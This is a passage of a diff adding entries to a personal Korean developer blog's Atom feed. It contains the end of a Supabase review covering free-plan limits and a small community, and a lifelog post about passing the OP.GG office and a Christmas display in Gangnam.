+    <p>제한된 무료 플랜: 무료 플랜에서 제공하는 리소스가 제한적이어서, 대규모 프로젝트나 고성능이 요구되는 경우 유료 플랜으로의 업그레이드가 필요할 수 있습니다.</p>
+  </li>
+  <li>
+    <p>커뮤니티와 지원: Firebase와 같은 대안에 비해 커뮤니티가 작고, 지원 리소스나 해결책이 상대적으로 적을 수 있습니다.</p>
+  </li>
+</ul>
+
+<p>비교적 새로 생겨 정보량이 타 DB에 비해서 적은편이고 사용하려면 Supabase에서 제공하는 Docs를 읽고 직접 해석하며 적용하는 방법이 가장 좋을 정도였습니다.</p>
+
+<p>하지만 매우 직관적이고 강력한 기능들을 제공하고 있어 그다지 사용하기 어렵진 않았습니다.</p>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="project" /><summary type="html"><![CDATA[Supabase에 대한 간단한 정보와 사용후기를 기록합니다.]]></summary></entry><entry><title type="html">우연히 길걷다가 만나게된 OP.GG</title><link href="http://localhost:4000/lifelog/2023-11-17-opgg/" rel="alternate" type="text/html" title="우연히 길걷다가 만나게된 OP.GG" /><published>2023-11-17T00:00:00+09:00</published><updated>2024-08-19T13:43:33+09:00</updated><id>http://localhost:4000/lifelog/opgg</id><content type="html" xml:base="http://localhost:4000/lifelog/2023-11-17-opgg/"><![CDATA[<p><img src="/assets/img/lifelog/opgg.jpg" alt="오피지지 회사" /></p>
+
+<p>11월 중순쯤, 멋쟁이사자처럼 프론트엔드 Plus를 다니던 때였습니다.</p>
+
+<p>오늘 따라 점심에 규동이 먹고싶어서 네이버지도를 보면서 길을 걷던 도중에 우연히 익숙한 로고를 보게 되었습니다.</p>
+
+<p>‘OP.GG’ 로고… 예전에 롤을 할때 정말 많이 사용했던 사이트인데 길거리에서 보게 되니 기분이 이상했습니다.</p>
+
+<p>뭔가 개발자가 되기 위해 공부중이기도 해서 그런지 ‘더 열심히 해서 나도 일해보고싶다’라는 생각도 들고, 이런데서 일하는 나를 생각해보니 멋있다는 생각도 들어서 더욱 열심히 공부해야겠다는 생각이 들었네요.</p>
+
+<h2 id="학원으로-돌아가는-길">학원으로 돌아가는 길</h2>
+
+<p><img src="/assets/img/lifelog/IMG_0064.jpg" alt="강남 롯데백화점 크리스마스 이벤트 전시회" /></p>
+
+<p>강남 현대백화점 무역센타점을 지나가는 길에 ‘해리의 꿈의 상점’을 보게 되었습니다.</p>
+
+<p>처음에는 그냥 스토어인줄 알았는데 이름이 있더군요.</p>
+
+<p>크리스마스 느낌이 물씬 풍겨서 좋았습니다.</p>
+
+<p><img src="/assets/img/lifelog/IMG_0065.jpg" alt="강남 롯데백화점 크리스마스 이벤트 전시회" /></p>
+
+<p>안쪽에는 트리도 있어쏙,</p>
+
+<p><img src="/assets/img/lifelog/IMG_0067.jpg" alt="강남 롯데백화점 크리스마스 이벤트 전시회" /></p>
+
+<p><img src="/assets/img/lifelog/IMG_0068.jpg" alt="강남 롯데백화점 크리스마스 이벤트 전시회" /></p>
+
+<p>여러 곰돌이들과 함께 장식되어있고 샹들리에까지 있어서 정말 이뻣습니다.</p>
+
+<p>제가 사진을 못찍어서 담아내지 못하는게 너무 아쉽네요.</p>
+
+<p>점심시간이라 테헤란로에 근무하시는 여러 직원분들도 오셔서 구경하셨고, 어린애들도 많이 방문하는것 같았습니다.</p>
+
+<p>저도 개발자로서 이런 곳에서 근무한다면 정말 좋을거같네요.</p>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="lifelog" /><summary type="html"><![CDATA[내가 사는 이야기]]></summary></entry></feed>
